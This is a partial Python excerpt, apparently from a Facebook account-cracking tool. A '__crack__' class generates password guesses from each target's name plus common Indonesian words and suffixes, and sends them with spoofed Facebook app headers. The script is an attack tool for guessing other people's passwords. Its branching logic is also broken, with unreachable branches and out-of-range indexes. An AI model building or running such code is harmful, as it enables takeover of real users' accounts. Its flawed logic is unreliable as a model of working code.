...
class __crack__:
    ...
    def __api__(self, user, _yan_):
        ...
        for pw in _yan_:
            ...
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                ...
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                            	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', xz[0]+'ganteng', xz[0]+'cantik', 'sayang', 'bismillah',
                        	]
                        elif len(xz) == 1:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', xz[0]+'ganteng', xz[0]+'cantik', 'sayang', 'bismillah', 
                        		xz[1], xz[1]+'123', xz[1]+'1234', xz[1]+'12345', xz[1]+'ganteng', xz[1]+'cantik', 'sayang', 'bismillah',
                        	]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', xz[0]+'ganteng', xz[0]+'cantik', 'sayang', 'bismillah', 
                        		xz[1], xz[1]+'123', xz[1]+'1234', xz[1]+'12345', xz[1]+'ganteng', xz[1]+'cantik', 'sayang', 'bismillah', 
                        		xz[2], xz[2]+'123', xz[2]+'1234', xz[2]+'12345', xz[2]+'ganteng', xz[2]+'cantik', 'sayang', 'bismillah',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', xz[0]+'ganteng', xz[0]+'cantik', 'sayang', 'bismillah', 
                        		xz[1], xz[1]+'123', xz[1]+'1234', xz[1]+'12345', xz[1]+'ganteng', xz[1]+'cantik', 'sayang', 'bismillah', 
                        		xz[2], xz[2]+'123', xz[2]+'1234', xz[2]+'12345', xz[2]+'ganteng', xz[2]+'cantik', 'sayang', 'bismillah', 
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', xz[3]+'ganteng', xz[3]+'cantik', 'sayang', 'bismillah',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', xz[0]+'ganteng', xz[0]+'cantik', 'sayang', 'bismillah', 
                        		...
                        		xz[2], xz[2]+'123', xz[2]+'1234', xz[2]+'12345', xz[2]+'ganteng', xz[2]+'cantik', 'sayang', 'bismillah', 
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', xz[3]+'ganteng', xz[3]+'cantik', 'sayang', 'bismillah', 
                        		xz[4], xz[4]+'123', xz[4]+'1234', xz[4]+'12345', xz[4]+'ganteng', xz[4]+'cantik', 'sayang', 'bismillah',
                        	]
                        elif len(xz) == 5:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', xz[0]+'ganteng', xz[0]+'cantik', 'sayang', 'bismillah', 
                        		...
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', xz[3]+'ganteng', xz[3]+'cantik', 'sayang', 'bismillah', 
                        		xz[4], xz[4]+'123', xz[4]+'1234', xz[4]+'12345', xz[4]+'ganteng', xz[4]+'cantik', 'sayang', 'bismillah', 
                        		xz[5], xz[5]+'123', xz[5]+'1234', xz[5]+'12345', xz[5]+'ganteng', xz[5]+'cantik', 'sayang', 'bismillah',
                        	]
